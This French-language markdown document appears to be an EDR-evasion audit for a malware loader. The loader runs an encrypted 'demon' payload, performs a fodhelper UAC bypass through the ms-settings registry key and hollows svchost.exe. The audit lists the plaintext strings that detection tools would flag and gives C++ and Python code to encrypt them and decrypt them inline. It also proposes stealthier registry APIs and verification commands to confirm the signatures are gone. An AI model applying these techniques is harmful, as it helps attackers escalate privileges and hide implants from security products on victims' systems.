# EDR Strings Audit - AES Loader

## 📋 Analyse Complète des Strings Non-Chiffrées

### Résumé Exécutif
Le loader contient actuellement **7 strings sensibles** non-chiffrées qui pourraient être détectées par les EDR lors d'une analyse statique du binaire.

---

## 🔴 STRINGS NON-CHIFFRÉES (À CORRIGER)

### 1. **Registry Path - UAC Bypass (Critique)**
| Localisation | String | Risque | Impact EDR |
|-------------|--------|--------|-----------|
| `uac_bypass.cpp:26` | `"Software\\Classes\\ms-settings\\shell\\open\\command"` | 🔴 Critique | Détection immédiate du UAC bypass |

**Raison du risque**: C'est la signature classique du bypass fodhelper. Les EDR scannent cette clé.
**Solution**: Chiffrer et décrypter inline dans execute_fodhelper()

---

### 2. **Registry Value Name**
| Localisation | String | Risque | Impact EDR |
|-------------|--------|--------|-----------|
| `uac_bypass.cpp:44` | `"DelegateExecute"` | 🔴 Critique | Signature UAC bypass bien connue |

**Raison du risque**: DelegateExecute + empty value = UAC bypass signature
**Solution**: Chiffrer cette chaîne aussi

---

### 3. **ShellExecute Verb**
| Localisation | String | Risque | Impact EDR |
|-------------|--------|--------|-----------|
| `uac_bypass.cpp:50` | `"open"` | 🟡 Moyen | Pattern matching API suspicious |

**Raison du risque**: ShellExecuteA avec "open" + registry hijacking = UAC bypass
**Solution**: Chiffrer ou utiliser obfuscation

---

### 4. **Default Target Process**
| Localisation | String | Risque | Impact EDR |
|-------------|--------|--------|-----------|
| `loader.cpp:22` | `"svchost.exe"` | 🟡 Moyen | Processus injection classique |

**Raison du risque**: svchost est le process hollowing par défaut
**Solution**: Chiffrer pour eviter détection statique simple

---

## 🟢 STRINGS DÉJÀ CHIFFRÉES ✅

| Description | Localisation | Status |
|-------------|-------------|--------|
| **Payload principal** | `demon.x64.h` | ✅ Chiffré (seed + ciphertext) |
| **Chemin fodhelper** | `demon.x64.h` | ✅ Chiffré (48 bytes AES) |

---

## 📊 Priorité d'Implémentation

### Priorité 1 - CRITIQUE (Implémentation immédiate)
```
🔴 uac_bypass.cpp:26 - Registry path "Software\\Classes\\ms-settings\\shell\\open\\command"
🔴 uac_bypass.cpp:44 - "DelegateExecute"
```
**Pourquoi**: Signatures bien connues des EDR pour UAC bypass

### Priorité 2 - IMPORTANT
```
🟡 uac_bypass.cpp:50 - "open" verb
🟡 loader.cpp:22 - "svchost.exe" default
```
**Pourquoi**: Peut aider à éviter détection comportementale

---

## 🛠️ Plan d'Implémentation

### Phase 1: Ajouter aux encrypted globals dans demon.x64.h
```python
# Ajouter à myenc.py:
registry_path_enc = "Software\\Classes\\ms-settings\\shell\\open\\command"
delegate_execute_enc = "DelegateExecute"
shell_verb_enc = "open"
default_process_enc = "svchost.exe"
```

### Phase 2: Déchiffrer inline dans chaque fonction

**uac_bypass.cpp - execute_fodhelper()**
```cpp
// Decrypt registry path
std::vector<uint8_t> reg_path_dec;
cipher.Decrypt(registry_path_enc, registry_path_enc_len, reg_path_dec);
std::string reg_path_str(reg_path_dec.begin(), reg_path_dec.end());

// Decrypt DelegateExecute
std::vector<uint8_t> delegate_dec;
cipher.Decrypt(delegate_execute_enc, delegate_execute_enc_len, delegate_dec);
std::string delegate_str(delegate_dec.begin(), delegate_dec.end());

// Decrypt shell verb
std::vector<uint8_t> verb_dec;
cipher.Decrypt(shell_verb_enc, shell_verb_enc_len, verb_dec);
std::string verb_str(verb_dec.begin(), verb_dec.end());

// Utilise les strings déchiffrées
RegCreateKeyExA(HKEY_CURRENT_USER, reg_path_str.c_str(), ...);
RegSetValueExA(hKey, delegate_str.c_str(), ...);
ShellExecuteA(NULL, verb_str.c_str(), ...);
```

**loader.cpp - parse_args()**
```cpp
// Decrypt default process name
std::vector<uint8_t> proc_dec;
cipher.Decrypt(default_process_enc, default_process_enc_len, proc_dec);
std::string default_proc(proc_dec.begin(), proc_dec.end());

// Retourner le string déchiffré au lieu de "svchost.exe" hardcoded
```

---

## 📝 Notes Techniques

### Format d'Encryptage à Utiliser
- **Algorithme**: AES-256-CBC (consistent avec easCipher42)
- **Seed**: Inclus dans le payload principal (demon.x64.h)
- **Durée de vie**: Déchiffrer juste avant utilisation, oublier immédiatement

### Considérations Sécurité
1. **Ne pas stocker** les strings déchiffrées dans des variables globales
2. **Déchiffrer inline** dans chaque fonction qui les utilise
3. **Utiliser des `std::vector<uint8_t>`** temporaires
4. **Convertir en `std::string`** uniquement si nécessaire
5. **Laisser les strings temporaires** quitter la scope rapidement

### Pattern Obfuscation Supplémentaire (Optionnel)
```cpp
// Au lieu de:
RegCreateKeyExA(HKEY_CURRENT_USER, decrypted_path.c_str(), ...);

// Utiliser des API alternatives:
// - RegCreateKeyExW (Unicode version)
// - Direct registry manipulation via RtlCreateRegistryKey (NT API)
// - Registry via WMI (plus discret)
```

---

## 🎯 Vérification Post-Implémentation

Après implémentation, faire des checks:

```bash
# 1. Vérifier que les strings ne sont plus en clair
strings loader.exe | grep -i "Software\\Classes\\ms-settings"  # ✅ Devrait être vide
strings loader.exe | grep -i "DelegateExecute"                  # ✅ Devrait être vide
strings loader.exe | grep -i "svchost"                          # ✅ Devrait être vide

# 2. Vérifier que les globals chiffrées existent
strings loader.exe | grep "registry_path_enc"                   # ✅ Doit exister
strings loader.exe | grep "delegate_execute_enc"                # ✅ Doit exister
strings loader.exe | grep "shell_verb_enc"                      # ✅ Doit exister

# 3. Test fonctionnel
./loader.exe -m uac -v  # Doit encore marcher
```

---

## 📌 Autres Strings Observées (Debug Logs)

Ces strings sont **dans les `std::cout`** - OK pour DEBUG (peuvent être enlevés avant production):

```
[*] Executing UAC bypass via fodhelper...
[-] Fodhelper decrypt FAILED
[*] Registry command:
[-] RegCreateKeyEx failed:
[-] ShellExecute failed:
[+] fodhelper.exe launched (elevated)
```

**Action**: Garder pour `-v` verbose flag, mais envisager de les chiffrer aussi si besoin de stealth complet.

---

## Résumé Final

| Item | Status | Action |
|------|--------|--------|
| Fodhelper path | ✅ Chiffré | Aucune |
| Payload | ✅ Chiffré | Aucune |
| Registry path | ❌ Clair | **À chiffrer** |
| DelegateExecute | ❌ Clair | **À chiffrer** |
| Shell verb "open" | ❌ Clair | **À chiffrer** |
| Default process | ❌ Clair | **À chiffrer** |
| Debug logs | ⚠️ Logs | Optionnel |

**Nombre de fixes requis: 4 (HIGH PRIORITY)**
